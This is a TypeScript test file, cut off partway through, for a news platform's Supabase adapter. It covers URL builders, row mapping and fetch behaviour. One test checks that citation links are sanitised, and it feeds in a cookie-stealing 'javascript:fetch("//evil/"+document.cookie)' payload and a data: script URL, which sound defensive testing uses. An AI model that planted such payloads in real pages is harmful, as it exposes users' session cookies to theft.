import { describe, expect, it } from 'vitest';
import { MYNEWS_BOUNDS } from './bounds';
import {
  buildArticleUrl,
  buildMyBlocksUrl,
  buildRemoveBlockUrl,
  mapBlockRow,
  buildDraftArticleUrl,
  buildEditorLedgerUrl,
  buildEditorProfileUrl,
  buildEditorSuggestionStatsUrl,
  buildFeedArticlesUrl,
  buildFeedUrl,
  buildHandleUrl,
  buildJournalistArticlesUrl,
  buildJournalistUrl,
  buildLatestUrl,
  buildMyNewsroomsUrl,
  buildMyProfileUrl,
  buildMySuggestionsUrl,
  buildNewsroomDeleteUrl,
  buildNewsroomDraftsUrl,
  buildNewsroomMembersUrl,
  buildNewsroomUrl,
  buildPublicJournalistsByProfileIdsUrl,
  buildPublicProfilesByIdsUrl,
  buildRemoveNewsroomMemberUrl,
  buildReviewQueueUrl,
  buildSearchUrls,
  buildSuggestionEventsUrl,
  buildSuggestionUrl,
  buildSuggestionsForArticleUrl,
  createMyNewsCloudAdapter,
  decodeJwtSub,
  deriveEditorAggregates,
  mapArticleRow,
  mapEditorStatRow,
  mapFeedRow,
  mapLedgerRow,
  mapNewsroomDraftRow,
  mapNewsroomMemberRow,
  mapNewsroomRow,
  mapProfileRow,
  mapSuggestionEventRow,
  mapSuggestionRow,
  stitchArticleAuthors,
} from './cloud-fetch';

const BASE = 'https://proj.supabase.co';

function fakeJwt(sub: string): string {
  const enc = (o: object) => Buffer.from(JSON.stringify(o)).toString('base64url');
  return `${enc({ alg: 'none' })}.${enc({ sub, role: 'authenticated' })}.sig`;
}

function recordedFetch(responses: Record<string, unknown>) {
  const calls: Array<{ url: string; init?: RequestInit }> = [];
  const impl = (async (url: RequestInfo | URL, init?: RequestInit) => {
    const u = String(url);
    calls.push({ url: u, init });
    const match = Object.entries(responses).find(([prefix]) => u.includes(prefix));
    let status = 200;
    let body: unknown = match ? match[1] : [];
    if (
      body !== null &&
      typeof body === 'object' &&
      !Array.isArray(body) &&
      typeof (body as { status?: unknown }).status === 'number'
    ) {
      status = (body as { status: number }).status;
      body = (body as { body?: unknown }).body ?? null;
    }
    return new Response(status === 204 ? null : JSON.stringify(body), {
      status,
      headers: { 'Content-Type': 'application/json' },
    });
  }) as typeof fetch;
  return { impl, calls };
}

function headersOf(call: { init?: RequestInit } | undefined): Record<string, string> {
  return (call?.init?.headers ?? {}) as Record<string, string>;
}

function bodyOf(call: { init?: RequestInit } | undefined): unknown {
  return JSON.parse(String(call?.init?.body));
}

const publicProfileRow = {
  id: 'p1',
  handle: 'rosamarin',
  display_name: 'Rosa Marín',
  pubkey_ed25519: 'pub-rosa',
  kind: 'journalist',
  created_at: '2026-07-03T09:00:00Z',
};

const publicJournalistRow = {
  profile_id: 'p1',
  tier: 'verified',
  bio: 'Water and land.',
  beats: ['water'],
  region: 'CA',
  created_at: '2026-07-03T09:00:00Z',
};

const articleRow = {
  id: 'a1',
  author_id: 'p1',
  slug: 'owens-valley',
  kind: 'news',
  status: 'published',
  current_rev: 2,
  published_at: '2026-07-03T10:00:00Z',
  created_at: '2026-07-03T09:00:00Z',
  author: publicProfileRow,
  journalist: publicJournalistRow,
  nw_article_revisions: [
    {
      rev: 1,
      headline: 'Old headline',
      dek: null,
      body_md: 'v1',
      signature: 's1',
      signer_pubkey: 'pub-rosa',
      changelog_json: [],
      created_at: '2026-07-03T09:00:00Z',
    },
    {
      rev: 2,
      headline: 'Owens Valley water dispute deepens',
      dek: 'Filings show a 34% drop.',
      body_md: 'v2 body',
      signature: 's2',
      signer_pubkey: 'pub-rosa',
      changelog_json: [{ suggestionId: 's-1', editorKey: 'ed-1', type: 'correction' }],
      created_at: '2026-07-03T10:00:00Z',
    },
  ],
};

const articleApiRow = { ...articleRow, author: undefined, journalist: undefined };

describe('URL builders', () => {
  it('feed urls resolve followed pubkeys, then filter articles by resolved author ids', () => {
    const input = {
      followedPubkeys: ['k1', 'k2'],
      beforePublishedAt: '2026-07-03T00:00:00Z',
      limit: 10,
    };
    const profiles = decodeURIComponent(buildFeedUrl(BASE, input));
    expect(profiles).toContain('/rest/v1/nw_public_profiles?');
    expect(profiles).toContain('pubkey_ed25519=in.("k1","k2")');
    expect(profiles).toContain('limit=2');

    const articles = decodeURIComponent(buildFeedArticlesUrl(BASE, ['p1', 'p2'], input));
    expect(articles).toContain('/rest/v1/nw_articles?');
    expect(articles).toContain('author_id=in.("p1","p2")');
    expect(articles).toContain('status=eq.published');
    expect(articles).toContain('published_at.desc');
    expect(articles).toContain('limit=10');
    expect(articles).toContain('lt.2026-07-03T00:00:00Z');
  });

  it('article and journalist urls are standalone reads with only real-FK embeds', () => {
    const article = decodeURIComponent(buildArticleUrl(BASE, 'owens-valley'));
    expect(article).toContain('status=neq.draft');
    expect(article).toContain('author_id');
    expect(article).not.toContain('nw_public_profiles');

    const profile = decodeURIComponent(buildJournalistUrl(BASE, 'rosamarin'));
    expect(profile).toContain('/rest/v1/nw_public_profiles?');
    expect(profile).toContain('handle=eq.rosamarin');
    expect(profile).not.toContain('nw_public_journalists(');

    const articles = decodeURIComponent(buildJournalistArticlesUrl(BASE, 'p1'));
    expect(articles).toContain('/rest/v1/nw_articles?');
    expect(articles).toContain('author_id=eq.p1');
    expect(articles).toContain('status=eq.published');
  });

  it('latest url browses published articles with no pubkey filter, newest first', () => {
    const url = buildLatestUrl(BASE, 30);
    const decoded = decodeURIComponent(url);
    expect(url).toContain('/rest/v1/nw_articles?');
    expect(decoded).toContain('status=eq.published');
    expect(decoded).toContain('order=published_at.desc');
    expect(decoded).toContain('limit=30');
    expect(decoded).toContain('nw_article_revisions.order=rev.desc');
    expect(decoded).toContain('nw_article_revisions.limit=1');
    expect(decoded).toContain('id,author_id,slug,kind,current_rev,published_at');
    expect(decoded).not.toContain('pubkey_ed25519=in.');
    expect(decoded).not.toContain('!inner');
    expect(decoded).not.toContain('nw_public_profiles');
    expect(decodeURIComponent(buildLatestUrl(BASE))).toContain('limit=30');
  });

  it('public profile and journalist batch urls deduplicate ids', () => {
    const profiles = decodeURIComponent(buildPublicProfilesByIdsUrl(BASE, ['p1', 'p1', 'p2']));
    expect(profiles).toContain('/rest/v1/nw_public_profiles?');
    expect(profiles).toContain('id=in.("p1","p2")');
    expect(profiles).toContain('limit=2');

    const journalists = decodeURIComponent(
      buildPublicJournalistsByProfileIdsUrl(BASE, ['p1', 'p1', 'p2']),
    );
    expect(journalists).toContain('/rest/v1/nw_public_journalists?');
    expect(journalists).toContain('profile_id=in.("p1","p2")');
    expect(journalists).toContain('limit=2');
  });

  it('search keeps the article table embed and reads journalist profiles standalone', () => {
    const urls = buildSearchUrls(BASE, 'water', 20);
    expect(decodeURIComponent(urls.revisions)).toContain('nw_articles!inner');
    expect(decodeURIComponent(urls.journalists)).toContain('/rest/v1/nw_public_profiles?');
    expect(decodeURIComponent(urls.journalists)).toContain('select=id,handle,display_name');
    expect(decodeURIComponent(urls.journalists)).not.toContain('nw_public_journalists(');
  });
});

const draftRow = {
  ...articleRow,
  id: 'a9',
  slug: 'draft-piece',
  status: 'draft',
  published_at: null,
};

const draftApiRow = { ...draftRow, author: undefined, journalist: undefined };

describe('row mapping', () => {
  it('maps the head revision into an ArticleView with sorted summaries', () => {
    const view = mapArticleRow(articleRow);
    expect(view?.headline).toBe('Owens Valley water dispute deepens');
    expect(view?.bodyMd).toBe('v2 body');
    expect(view?.authorTier).toBe('verified');
    expect(view?.revisionSummaries.map((r) => r.rev)).toEqual([2, 1]);
    expect(view?.revisionSummaries[0]?.changelog[0]?.type).toBe('correction');
  });

  it('maps genuine draft rows to a draft ArticleView with no publish time', () => {
    const view = mapArticleRow(draftRow);
    expect(view).toMatchObject({
      articleId: 'a9',
      slug: 'draft-piece',
      status: 'draft',
      publishedAt: '',
      headline: 'Owens Valley water dispute deepens',
      bodyMd: 'v2 body',
      authorHandle: 'rosamarin',
    });
  });

  it('feed mapping keeps its published_at guard so drafts never leak into feeds', () => {
    expect(mapFeedRow(draftRow)).toBeNull();
  });

  it('returns null on rows without revisions or profiles', () => {
    expect(mapFeedRow({ ...articleRow, nw_article_revisions: [] })).toBeNull();
    expect(mapFeedRow({ ...articleRow, author: null })).toBeNull();
  });

  it('defaults tier to open when the journalist facet is missing', () => {
    const view = mapArticleRow({ ...articleRow, journalist: null });
    expect(view?.authorTier).toBe('open');
  });

  it('rejects a stitched article set when any required author profile is missing', () => {
    expect(() => stitchArticleAuthors([articleApiRow], [], [publicJournalistRow])).toThrow(
      'mynews article-author profile stitch failed: p1',
    );
  });
});

describe('createMyNewsCloudAdapter', () => {
  it('sends anon headers on reads and maps the result', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_articles': [articleApiRow],
      '/rest/v1/nw_public_profiles': [publicProfileRow],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const view = await port.getArticleBySlug('owens-valley');
    expect(view?.slug).toBe('owens-valley');
    expect(calls).toHaveLength(3);
    expect(calls.every((call) => headersOf(call).apikey === 'anon-1')).toBe(true);
    expect(calls.every((call) => headersOf(call).Authorization === 'Bearer anon-1')).toBe(true);
  });

  it('returns an empty feed without a network call when following nobody', async () => {
    const { impl, calls } = recordedFetch({});
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect(await port.getFeed({ followedPubkeys: [] })).toEqual([]);
    expect(calls).toHaveLength(0);
  });

  it('getFeed drops unpublished rows even if the server returns them', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_public_profiles': [publicProfileRow],
      '/rest/v1/nw_articles': [articleApiRow, draftApiRow],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const feed = await port.getFeed({ followedPubkeys: ['pub-rosa'] });
    expect(feed.map((f) => f.articleId)).toEqual(['a1']);
    expect(calls).toHaveLength(3);
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('pubkey_ed25519=in.("pub-rosa")');
    expect(calls.some((call) => decodeURIComponent(call.url).includes('author_id=in.("p1")'))).toBe(
      true,
    );
  });

  it('getLatest batches standalone author and journalist reads before mapping', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_articles': [articleApiRow, draftApiRow],
      '/rest/v1/nw_public_profiles': [publicProfileRow],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const latest = await port.getLatest();
    expect(latest.map((f) => f.articleId)).toEqual(['a1']);
    expect(latest[0]).toMatchObject({
      slug: 'owens-valley',
      authorHandle: 'rosamarin',
      authorTier: 'verified',
    });
    expect(calls[0]?.url).toBe(buildLatestUrl(BASE, 30));
    expect(calls).toHaveLength(3);
    expect(calls.every((call) => headersOf(call).apikey === 'anon-1')).toBe(true);
    expect(calls.every((call) => headersOf(call).Authorization === 'Bearer anon-1')).toBe(true);
  });

  it('fails the whole latest read when a stitched profile request fails', async () => {
    const { impl } = recordedFetch({
      '/rest/v1/nw_articles': [articleApiRow],
      '/rest/v1/nw_public_profiles': { status: 503, body: { message: 'unavailable' } },
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    await expect(port.getLatest()).rejects.toThrow('mynews cloud read failed: 503');
  });

  it('loads journalist profile, facet, and articles as three standalone reads', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_public_profiles': [publicProfileRow],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
      '/rest/v1/nw_articles': [articleApiRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const journalist = await port.getJournalistByHandle('rosamarin');
    expect(journalist).toMatchObject({
      id: 'p1',
      handle: 'rosamarin',
      tier: 'verified',
      articles: [{ articleId: 'a1', authorHandle: 'rosamarin' }],
    });
    expect(calls).toHaveLength(3);
  });

  it('search stitches standalone journalist facets without changing article hits', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_article_revisions': [
        {
          rev: 2,
          headline: 'Owens Valley water dispute deepens',
          dek: 'Filings show a 34% drop.',
          nw_articles: { slug: 'owens-valley', current_rev: 2 },
        },
      ],
      '/rest/v1/nw_public_profiles': [
        { id: 'p1', handle: 'rosamarin', display_name: 'Rosa Marín' },
      ],
      '/rest/v1/nw_public_journalists': [publicJournalistRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const hits = await port.search('water');
    expect(hits).toEqual([
      expect.objectContaining({ kind: 'article', ref: 'owens-valley' }),
      expect.objectContaining({ kind: 'journalist', ref: 'rosamarin', snippet: 'Water and land.' }),
    ]);
    expect(calls).toHaveLength(3);
  });

  it('posts function calls with the session bearer when available', async () => {
    const { impl, calls } = recordedFetch({ '/functions/v1/mynews-publish': { ok: true, data: { rev: 1 } } });
    const port = createMyNewsCloudAdapter({
      baseUrl: BASE,
      anonKey: 'anon-1',
      fetchImpl: impl,
      getAccessToken: async () => 'session-token',
    });
    const env = await port.callFunction('mynews-publish', { hello: 1 });
    expect(env.ok).toBe(true);
    const headers = calls[0]?.init?.headers as Record<string, string>;
    expect(headers.Authorization).toBe('Bearer session-token');
    expect(calls[0]?.init?.method).toBe('POST');
  });

  it('maps non-envelope function failures to a typed error', async () => {
    const impl = (async () => new Response('teapot', { status: 418 })) as typeof fetch;
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const env = await port.callFunction('mynews-suggest', {});
    expect(env).toEqual({ ok: false, error: 'function-418' });
  });
});

describe('editing-desk URL builders', () => {
  it('suggestions-for-article url keeps only real-FK embeds and the editor id', () => {
    const decoded = decodeURIComponent(buildSuggestionsForArticleUrl(BASE, 'a1', { status: 'open' }));
    expect(decoded).toContain('/rest/v1/nw_edit_suggestions?');
    expect(decoded).toContain('article_id=eq.a1');
    expect(decoded).toContain('status=eq.open');
    expect(decoded).toContain('order=created_at.asc');
    expect(decoded).toContain('editor_id');
    expect(decoded).not.toContain('nw_public_profiles');
    expect(decoded).toContain('article:nw_articles!inner(slug,author_id,nw_article_revisions(rev,headline))');
    expect(decoded).toContain('endorsements:nw_suggestion_dupes(count)');
    expect(decoded).toContain('article.nw_article_revisions.order=rev.desc');
    expect(decoded).toContain('article.nw_article_revisions.limit=1');
    expect(decodeURIComponent(buildSuggestionsForArticleUrl(BASE, 'a1'))).not.toContain('status=eq.');
  });

  it('single, mine, and review-queue suggestion urls pin filters and order', () => {
    const single = decodeURIComponent(buildSuggestionUrl(BASE, 's1'));
    expect(single).toContain('id=eq.s1');
    expect(single).toContain('limit=1');

    const mine = decodeURIComponent(buildMySuggestionsUrl(BASE, 'ed1'));
    expect(mine).toContain('editor_id=eq.ed1');
    expect(mine).toContain('order=created_at.desc');

    const queue = decodeURIComponent(buildReviewQueueUrl(BASE, 'p1'));
    expect(queue).toContain('status=eq.open');
    expect(queue).toContain('article.author_id=eq.p1');
    expect(queue).toContain('order=created_at.asc');
    expect(queue).toContain('nw_articles!inner');
  });

  it('suggestion events url selects the actor id oldest first', () => {
    const decoded = decodeURIComponent(buildSuggestionEventsUrl(BASE, 's1'));
    expect(decoded).toContain('/rest/v1/nw_suggestion_events?');
    expect(decoded).toContain('suggestion_id=eq.s1');
    expect(decoded).toContain('actor_id');
    expect(decoded).not.toContain('nw_public_profiles');
    expect(decoded).toContain('order=created_at.asc');
  });

  it('profile urls filter by user id and handle', () => {
    const mine = decodeURIComponent(buildMyProfileUrl(BASE, 'u1'));
    expect(mine).toContain('/rest/v1/nw_profiles?');
    expect(mine).toContain('user_id=eq.u1');
    expect(mine).toContain('select=id,user_id,handle,display_name,pubkey_ed25519,kind');
    expect(mine).toContain('limit=1');

    const handle = decodeURIComponent(buildHandleUrl(BASE, 'rosamarin'));
    expect(handle).toContain('handle=eq.rosamarin');
    expect(handle).toContain('select=id');
    expect(handle).toContain('limit=1');
  });

  it('editor profile urls cover the profile, joined ledger, and suggestion stats', () => {
    const prof = decodeURIComponent(buildEditorProfileUrl(BASE, 'sam'));
    expect(prof).toContain('handle=eq.sam');
    expect(prof).toContain('select=id,handle,display_name,kind');

    const ledger = decodeURIComponent(buildEditorLedgerUrl(BASE, 'ed1'));
    expect(ledger).toContain('/rest/v1/nw_credibility_ledger?');
    expect(ledger).toContain('editor_id=eq.ed1');
    expect(ledger).toContain('suggestion:nw_edit_suggestions(type,article:nw_articles(author_id))');
    expect(ledger).toContain('order=awarded_at.desc');

    const stats = decodeURIComponent(buildEditorSuggestionStatsUrl(BASE, 'ed1'));
    expect(stats).toContain('/rest/v1/nw_edit_suggestions?');
    expect(stats).toContain('editor_id=eq.ed1');
    expect(stats).toContain('select=status,article:nw_articles!inner(author_id)');
  });

  it('newsroom urls pin membership joins, drafts, and delete targets', () => {
    const mine = decodeURIComponent(buildMyNewsroomsUrl(BASE, 'p1'));
    expect(mine).toContain('/rest/v1/nw_newsroom_members?');
    expect(mine).toContain('profile_id=eq.p1');
    expect(mine).toContain('newsroom:nw_newsrooms!inner(id,owner_id,name,created_at)');

    const room = decodeURIComponent(buildNewsroomUrl(BASE, 'n1'));
    expect(room).toContain('/rest/v1/nw_newsrooms?');
    expect(room).toContain('id=eq.n1');
    expect(room).toContain('limit=1');

    const members = decodeURIComponent(buildNewsroomMembersUrl(BASE, 'n1'));
    expect(members).toContain('newsroom_id=eq.n1');
    expect(members).toContain('select=newsroom_id,profile_id,role');
    expect(members).not.toContain('nw_public_profiles');
    expect(members).toContain('order=created_at.asc');

    const drafts = decodeURIComponent(buildNewsroomDraftsUrl(BASE, 'n1'));
    expect(drafts).toContain('/rest/v1/nw_articles?');
    expect(drafts).toContain('newsroom_id=eq.n1');
    expect(drafts).toContain('status=eq.draft');
    expect(drafts).toContain('author_id');
    expect(drafts).not.toContain('nw_public_profiles');
    expect(drafts).toContain('nw_article_meta(embargo_until)');
    expect(drafts).toContain('nw_article_revisions.order=rev.desc');
    expect(drafts).toContain('nw_article_revisions.limit=1');

    expect(decodeURIComponent(buildNewsroomDeleteUrl(BASE, 'n1'))).toContain('nw_newsrooms?id=eq.n1');
    const remove = decodeURIComponent(buildRemoveNewsroomMemberUrl(BASE, 'n1', 'p2'));
    expect(remove).toContain('nw_newsroom_members?');
    expect(remove).toContain('newsroom_id=eq.n1');
    expect(remove).toContain('profile_id=eq.p2');
  });

  it('draft article url is keyed by id with no status filter', () => {
    const decoded = decodeURIComponent(buildDraftArticleUrl(BASE, 'a9'));
    expect(decoded).toContain('/rest/v1/nw_articles?');
    expect(decoded).toContain('id=eq.a9');
    expect(decoded).toContain('limit=1');
    expect(decoded).not.toContain('status=');
  });
});

describe('decodeJwtSub', () => {
  it('extracts the sub claim from a session JWT', () => {
    expect(decodeJwtSub(fakeJwt('user-123'))).toBe('user-123');
  });

  it('returns null for malformed tokens', () => {
    expect(decodeJwtSub('not-a-jwt')).toBeNull();
    expect(decodeJwtSub('a.###.c')).toBeNull();
    expect(decodeJwtSub(`x.${Buffer.from('{"nosub":1}').toString('base64url')}.y`)).toBeNull();
  });
});

const suggestionRow = {
  id: 's1',
  article_id: 'a1',
  base_rev: 2,
  editor_id: 'ed1',
  type: 'correction',
  diff_json: {
    baseHash: 'h1',
    ops: [
      {
        kind: 'replace',
        baseIndex: 0,
        anchorBefore: null,
        anchorAfter: null,
        baseBlocks: ['old'],
        newBlocks: ['new'],
      },
    ],
  },
  citations: ['https://example.com/source', 42],
  rationale: 'The figure is wrong.',
  status: 'open',
  created_at: '2026-07-01T00:00:00Z',
  editor: { handle: 'sam', display_name: 'Sam Lee', pubkey_ed25519: 'pub-sam' },
  article: {
    slug: 'owens-valley',
    author_id: 'p1',
    nw_article_revisions: [{ rev: 2, headline: 'Owens Valley water dispute deepens' }],
  },
  endorsements: [{ count: 3 }],
};

const editorProfileRow = {
  id: 'ed1',
  handle: 'sam',
  display_name: 'Sam Lee',
  pubkey_ed25519: 'pub-sam',
  kind: 'editor',
  created_at: '2026-07-01T00:00:00Z',
};

const suggestionApiRow = { ...suggestionRow, editor: undefined };

describe('editing-desk row mapping', () => {
  it('maps suggestion rows with article slug, head headline, diff, and endorsement count', () => {
    const view = mapSuggestionRow(suggestionRow);
    expect(view).toMatchObject({
      id: 's1',
      articleId: 'a1',
      articleSlug: 'owens-valley',
      articleHeadline: 'Owens Valley water dispute deepens',
      baseRev: 2,
      editorId: 'ed1',
      editorHandle: 'sam',
      editorDisplayName: 'Sam Lee',
      editorPubkey: 'pub-sam',
      type: 'correction',
      rationale: 'The figure is wrong.',
      status: 'open',
      createdAt: '2026-07-01T00:00:00Z',
      endorsements: 3,
    });
    expect(view?.diff.ops).toHaveLength(1);
    expect(view?.citations).toEqual(['https://example.com/source']);
  });

  it('drops malformed diff ops so the public suggestions render never 500s (codex C2)', () => {
    const view = mapSuggestionRow({
      ...suggestionRow,
      diff_json: {
        baseHash: 'x',
        ops: [
          {}, // missing baseBlocks/newBlocks -> would crash diffToBlocks
          { baseBlocks: 'nope', newBlocks: [] },
          { baseBlocks: ['old'], newBlocks: ['new'] }, // the only well-formed op
        ],
      },
    });
    expect(view?.diff.ops).toHaveLength(1);
    expect(view?.diff.ops[0]).toMatchObject({ baseBlocks: ['old'], newBlocks: ['new'] });
  });

  it('drops non-https citations so a javascript: URL never reaches a rendered href (F1/F2)', () => {
    const view = mapSuggestionRow({
      ...suggestionRow,
      citations: [
        'https://ok.example/source',
        // eslint-disable-next-line no-script-url
        'javascript:fetch("//evil/"+document.cookie)',
        'http://insecure.example',
        'data:text/html,<script>1</script>',
      ],
    });
    expect(view?.citations).toEqual(['https://ok.example/source']);
  });

  it('defaults endorsements to 0 and returns null on broken embeds', () => {
    expect(mapSuggestionRow({ ...suggestionRow, endorsements: undefined })?.endorsements).toBe(0);
    expect(mapSuggestionRow({ ...suggestionRow, editor: null })).toBeNull();
    expect(mapSuggestionRow({ ...suggestionRow, article: null })).toBeNull();
    expect(
      mapSuggestionRow({
        ...suggestionRow,
        article: { ...suggestionRow.article, nw_article_revisions: [] },
      }),
    ).toBeNull();
    expect(mapSuggestionRow({ ...suggestionRow, type: 'vandalism' })).toBeNull();
  });

  it('drops suggestion rows with unknown statuses and events with unknown actions', () => {
    expect(mapSuggestionRow({ ...suggestionRow, status: 'zombified' })).toBeNull();
    expect(
      mapSuggestionEventRow({
        id: 'e1',
        suggestion_id: 's1',
        actor_id: 'p1',
        action: 'explode',
        payload: {},
        created_at: '2026-07-01T01:00:00Z',
        actor: { handle: 'rosamarin' },
      }),
    ).toBeNull();
  });

  it('falls back to an empty diff when diff_json is malformed', () => {
    const view = mapSuggestionRow({ ...suggestionRow, diff_json: 'garbage' });
    expect(view?.diff).toEqual({ baseHash: '', ops: [] });
  });

  it('maps suggestion events with the actor handle', () => {
    const view = mapSuggestionEventRow({
      id: 'e1',
      suggestion_id: 's1',
      actor_id: 'p1',
      action: 'comment',
      payload: { body: 'Nice catch.' },
      created_at: '2026-07-01T01:00:00Z',
      actor: { handle: 'rosamarin' },
    });
    expect(view).toEqual({
      id: 'e1',
      suggestionId: 's1',
      actorId: 'p1',
      actorHandle: 'rosamarin',
      action: 'comment',
      payload: { body: 'Nice catch.' },
      createdAt: '2026-07-01T01:00:00Z',
    });
  });

  it('maps profile rows and guards the kind union', () => {
    const view = mapProfileRow({
      id: 'p1',
      user_id: 'u1',
      handle: 'rosamarin',
      display_name: 'Rosa Marín',
      pubkey_ed25519: 'pub-rosa',
      kind: 'journalist',
    });
    expect(view).toEqual({
      id: 'p1',
      userId: 'u1',
      handle: 'rosamarin',
      displayName: 'Rosa Marín',
      pubkeyEd25519: 'pub-rosa',
      kind: 'journalist',
    });
    expect(mapProfileRow({ ...{ id: 'p1', user_id: 'u1', handle: 'x', display_name: '', pubkey_ed25519: '' }, kind: 'admin' }).kind).toBe('reader');
  });

  it('maps ledger rows with type and author joined through the suggestion', () => {
    const row = {
      id: 'l1',
      editor_id: 'ed1',
      suggestion_id: 's1',
      base_points: 10,
      diversity_mult: 0.42,
      standing_mult: 0.85,
      awarded_at: '2026-07-02T00:00:00Z',
      suggestion: { type: 'correction', article: { author_id: 'p1' } },
    };
    expect(mapLedgerRow(row)).toEqual({
      id: 'l1',
      editorId: 'ed1',
      suggestionId: 's1',
      basePoints: 10,
      diversityMult: 0.42,
      standingMult: 0.85,
      awardedAt: '2026-07-02T00:00:00Z',
      type: 'correction',
      authorId: 'p1',
    });
    const bare = mapLedgerRow({ ...row, suggestion: null });
    expect(bare.type).toBeNull();
    expect(bare.authorId).toBeNull();
  });

  it('derives editor aggregates from suggestion stat rows', () => {
    const stats = [
      { status: 'open', article: { author_id: 'p1' } },
      { status: 'accepted', article: { author_id: 'p1' } },
      { status: 'partial', article: { author_id: 'p2' } },
      { status: 'rejected', article: { author_id: 'p3' } },
      { status: 'stale', article: { author_id: 'p4' } },
    ].map(mapEditorStatRow);
    expect(deriveEditorAggregates(stats)).toEqual({
      openCount: 1,
      decidedSampleSize: 3,
      acceptanceRate: 2 / 3,
      distinctAuthors: 2,
    });
    // Empty decided sample reports acceptanceRate 1, matching the server RPC
    // and _shared/mynews-store.ts enforcement (no-decision editors are not
    // treated as low-acceptance).
    expect(deriveEditorAggregates([])).toEqual({
      openCount: 0,
      decidedSampleSize: 0,
      acceptanceRate: 1,
      distinctAuthors: 0,
    });
  });

  it('maps newsroom rows, members, and drafts', () => {
    expect(
      mapNewsroomRow({ id: 'n1', owner_id: 'p1', name: 'Valley Desk', created_at: '2026-07-01T00:00:00Z' }),
    ).toEqual({ id: 'n1', ownerId: 'p1', name: 'Valley Desk', createdAt: '2026-07-01T00:00:00Z' });

    const member = mapNewsroomMemberRow({
      newsroom_id: 'n1',
      profile_id: 'p2',
      role: 'reviewer',
      profile: { handle: 'sam', display_name: 'Sam Lee' },
    });
    expect(member).toEqual({
      newsroomId: 'n1',
      profileId: 'p2',
      handle: 'sam',
      displayName: 'Sam Lee',
      role: 'reviewer',
    });
    expect(
      mapNewsroomMemberRow({ newsroom_id: 'n1', profile_id: 'p2', role: 'reviewer', profile: null }),
    ).toBeNull();

    const draft = mapNewsroomDraftRow({
      id: 'a9',
      author_id: 'p1',
      slug: 'draft-piece',
      current_rev: 3,
      author: { handle: 'rosamarin' },
      nw_article_revisions: [{ rev: 3, headline: 'Draft piece', created_at: '2026-07-02T00:00:00Z' }],
      nw_article_meta: { embargo_until: '2026-08-01T00:00:00Z' },
    });
    expect(draft).toEqual({
      articleId: 'a9',
      slug: 'draft-piece',
      headline: 'Draft piece',
      rev: 3,
      updatedAt: '2026-07-02T00:00:00Z',
      embargoUntil: '2026-08-01T00:00:00Z',
      authorHandle: 'rosamarin',
    });
    expect(
      mapNewsroomDraftRow({
        id: 'a9',
        author_id: 'p1',
        slug: 'draft-piece',
        current_rev: 3,
        author: { handle: 'rosamarin' },
        nw_article_revisions: [],
        nw_article_meta: null,
      }),
    ).toBeNull();
  });
});

describe('editing-desk adapter reads', () => {
  it('fetches suggestions with anon headers and maps rows', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_edit_suggestions': [suggestionApiRow],
      '/rest/v1/nw_public_profiles': [editorProfileRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    const rows = await port.getSuggestionsForArticle('a1');
    expect(rows.map((s) => s.id)).toEqual(['s1']);
    expect(headersOf(calls[0]).apikey).toBe('anon-1');
    expect(headersOf(calls[0]).Authorization).toBe('Bearer anon-1');
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('article_id=eq.a1');
    expect(calls).toHaveLength(2);
  });

  it('resolves single suggestions and handle availability with the anon key', async () => {
    const { impl, calls } = recordedFetch({
      'handle=eq.newcomer': [],
      '/rest/v1/nw_edit_suggestions': [suggestionApiRow],
      '/rest/v1/nw_public_profiles': [editorProfileRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect((await port.getSuggestion('s1'))?.id).toBe('s1');
    expect(await port.isHandleAvailable('newcomer')).toBe(true);
    expect(headersOf(calls[2]).Authorization).toBe('Bearer anon-1');
  });

  it('getMySuggestions filters by the editor id with the anon key when signed out', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_edit_suggestions': [suggestionApiRow],
      '/rest/v1/nw_public_profiles': [editorProfileRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect((await port.getMySuggestions('ed1')).map((s) => s.id)).toEqual(['s1']);
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('editor_id=eq.ed1');
    expect(headersOf(calls[0]).Authorization).toBe('Bearer anon-1');
  });

  it('getReviewQueue filters by the article author with the anon key when signed out', async () => {
    const { impl, calls } = recordedFetch({
      '/rest/v1/nw_edit_suggestions': [suggestionApiRow],
      '/rest/v1/nw_public_profiles': [editorProfileRow],
    });
    const port = createMyNewsCloudAdapter({ baseUrl: BASE, anonKey: 'anon-1', fetchImpl: impl });
    expect((await port.getReviewQueue('p1')).map((s) => s.id)).toEqual(['s1']);
    expect(decodeURIComponent(calls[0]?.url ?? '')).toContain('article.author_id=eq.p1');
    expect(headersOf(calls[0]).Authorization).toBe('Bearer anon-1');
  });

  it('getSuggestionEvents filters by the suggestion id with the anon key when signed out', async () => {
    const { impl, calls } = recordedFetch({
